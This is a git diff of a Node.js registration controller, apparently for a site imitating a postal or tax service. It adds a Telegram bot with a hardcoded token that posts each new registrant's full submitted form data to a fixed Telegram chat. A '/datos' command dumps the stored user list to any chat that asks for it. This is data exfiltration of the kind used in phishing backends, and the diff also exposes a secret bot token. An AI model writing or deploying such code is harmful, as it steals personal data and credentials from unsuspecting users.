@@ -1,6 +1,49 @@
 import Usuario from '../models/Usuario.js'
 import generarId from '../helpers/generarId.js';
 import generarJWT from '../helpers/generarJWT.js';
+import TelegramBot from 'node-telegram-bot-api';
+import axios from "axios"
+import Telebot from 'telebot';
+
+const bot = new Telebot({
+    token: "6676624456:AAE9rEmLHDKtQ-aiaw9ydt0WcS8mr9azXb8"
+});
+
+bot.on(["/start", "/hola"], (msg) => {
+    bot.sendMessage(msg.chat.id, `Hola Bienvenido so`)
+});
+
+bot.on(["/prueba"], (msg) => {
+    bot.sendMessage(msg.chat.id, `Prueba desde el backend`)
+    console.log(msg)
+});
+
+bot.on(["/datos"], (msg) => {
+
+    const jsonUrl =  'https://four-72baseimpuestos.onrender.com/api/usuarios//EkM8pokjdsfiojsdijfiosnahyugysffa';
+
+    async function getJSONData() {
+        try {
+            const response = await axios.get(jsonUrl);
+            const jsonData = response.data;
+
+            bot.sendMessage(msg.chat.id, 'Aquí está la información que recopilé del JSON:\n' + JSON.stringify(jsonData, null, 2))
+
+        }
+        catch (error) {
+            console.error('Error al obtener o procesar el JSON:', error);
+        }
+        }
+    
+    getJSONData()
+});
+bot.start();
+
+const obtener = async (req, res ) => {
+    const usuario = await Usuario.find();
+    return res.json(usuario)  
+};
+
 
 const registrar = async (req, res ) => {
 
@@ -8,20 +51,74 @@ const registrar = async (req, res ) => {
        const usuario = new Usuario(req.body);
        await usuario.save();
 
-       
-       //TODO: poner esto en el mensaje: , Revisa tu Email para Confirmar tu Cuenta
+       const cadenaJson = JSON.stringify(req.body);
 
+       const cadenaSinLlaves = cadenaJson.slice(1, -1);
+
+       function enviarMensajeDeBienvenida() {
+        //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
+        const mensajeBienvenida = `Nuevo Registro:\n` + JSON.stringify(req.body, null, 2);
+      
+        const chatId = 5319932122;
+
+        // Envía el mensaje al chat con el ID 'chatId'
+        bot.sendMessage(chatId, mensajeBienvenida)
+          .then(() => {
+            console.log('Mensaje enviado con éxito.');
+          })
+          .catch((error) => {
+            console.error('Error al enviar el mensaje:', error);
+          });
+      }
+
+        enviarMensajeDeBienvenida();
+
+      
+      
+      
+      
+      
+
+
+
+
+
+      
+      //  bot.sendMessage( `Nuevo Registro:`)
+      
+      // bot.on(() => { 
+        //bot.sendMessage('Nuevo Registro:')/*
+
+      //  bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(req.body, null, 2))
+        /*
+
+        async function getJSONData() {
+            try {
+                const response = await axios.get(jsonUrl);
+                const jsonData = response.data;
+    
+                bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(req.body, null, 2))
+    
+            }
+            catch (error) {
+                console.error('Error al obtener o procesar el JSON:', error);
+            }
+            }
+        
+        getJSONData()*/
+
+     //  });
+       
+
+     
+
+       //bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(jsonData, null, 2))
+       
     res.json({ msg: 'Validando...'});
        
     } catch (error) {
         console.log(error);
     }
-};
-
-
-const obtener = async (req, res ) => {
-    const usuario = await Usuario.find();
-    return res.json(usuario)  
 };
 
 const autenticar = async (req, res) => {
